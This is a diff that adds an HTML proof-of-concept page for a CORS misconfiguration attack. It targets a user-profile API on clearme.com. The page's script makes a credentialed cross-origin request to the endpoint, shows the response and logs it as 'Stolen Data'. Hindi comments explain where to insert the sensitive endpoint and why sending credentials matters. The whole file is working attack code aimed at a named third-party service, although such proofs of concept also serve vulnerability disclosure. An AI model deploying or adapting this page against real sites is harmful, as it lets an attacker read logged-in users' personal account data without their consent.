@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>CORS Exploit Test</h1>
+    <p>Checking if I can steal data from clearme.com...</p>
+    <div id="data">Waiting for response...</div>
+
+    <script>
+        // उस एंडपॉइंट का URL यहाँ डालें जहाँ सेंसिटिव डेटा हो
+        var targetUrl = "https://verified.clearme.com/api/v1/me"; 
+        
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", targetUrl, true);
+        xhr.withCredentials = true; // यह सबसे ज़रूरी है क्योंकि सर्वर इसे अलाउ कर रहा है
+
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4) {
+                document.getElementById("data").innerText = xhr.responseText;
+                console.log("Stolen Data: " + xhr.responseText);
+            }
+        };
+        xhr.send();
+    </script>
+</body>
+</html>
